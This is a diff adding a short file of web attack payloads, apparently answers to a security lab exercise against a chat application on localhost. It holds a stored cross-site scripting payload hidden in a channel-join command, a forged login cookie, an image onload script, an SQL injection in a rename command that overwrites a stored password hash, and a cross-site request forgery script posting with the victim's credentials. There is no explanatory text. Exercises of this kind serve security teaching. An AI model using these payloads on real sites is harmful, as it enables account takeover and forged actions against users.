@@ -1,0 +1,31 @@
+###############10###############
+/join #fk<script>$.post('/post', { 'channel': '#general-spam', 'message' : ' Good&nbspMorning!' })</script> 
+
+
+document.cookie ="login = ZWR3YXJk ; expires = Thu, 20 Dec 2018 12:00:00 UTC;path=/";
+
+
+<img src="https://media.giphy.com/media/6uMqzcbWRhoT6/giphy.gif"
+     onload="
+        if (window.localStorage['cat']) {$(this).hide();}
+        else {window.localStorage['cat'] = true;}
+     "
+    />
+	
+	
+/rename bob ',password='7110eda4d09e062aa5e4a390b0a572ac0d2c0220
+
+
+
+  <script type="text/javascript">
+   var data = {'channel': '#announcements','message' :'Give Edward a Raise!'};
+    $.ajax({
+      url: "http://localhost:8000/post",
+      data: data,
+      type: 'POST',
+      xhrFields:{
+       withCredentials: true
+      }
+
+    });
+	
